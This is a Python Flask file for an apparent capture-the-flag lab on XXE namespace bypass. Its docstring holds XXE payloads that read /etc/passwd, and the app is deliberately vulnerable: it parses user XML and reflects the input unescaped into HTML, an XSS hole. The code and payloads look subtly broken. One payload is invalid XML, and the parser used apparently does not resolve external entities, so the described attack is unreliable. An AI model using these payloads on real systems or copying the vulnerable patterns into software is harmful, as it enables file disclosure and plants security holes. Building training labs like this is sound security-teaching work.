"""
XXE Lab 15: XXE Namespace Bypass
Difficulty: 3 (Advanced)
Points: 100

Description:
XXE bypassing namespace restrictions.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: XXE with namespace bypass
    
    Attack Vector:
    Using different namespaces to inject entities:
    
    <?xml version="1.0"?>
    <foo xmlns:xxe="http://attacker.com/xxe">
        <!DOCTYPE bar [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <element>&xxe;</element>
    </foo>
    
    Or using namespace prefix:
    <?xml version="1.0"?>
    <!DOCTYPE xxe:foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <xxe:foo xmlns:xxe="http://example.com">&xxe;</xxe:foo>
    
    Flag: FLAG{xxe_namespace_bypass_015}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    
    if xml_input:
        try:
            root = ET.fromstring(xml_input)
            result = ET.tostring(root, encoding='unicode')
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>XXE Namespace Bypass</h1>
        <form method="POST">
            <textarea name="xml" rows="10" cols="60">{xml_input}</textarea>
            <button>Parse</button>
        </form>
        {f"<pre>{result}</pre>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5015, debug=False)
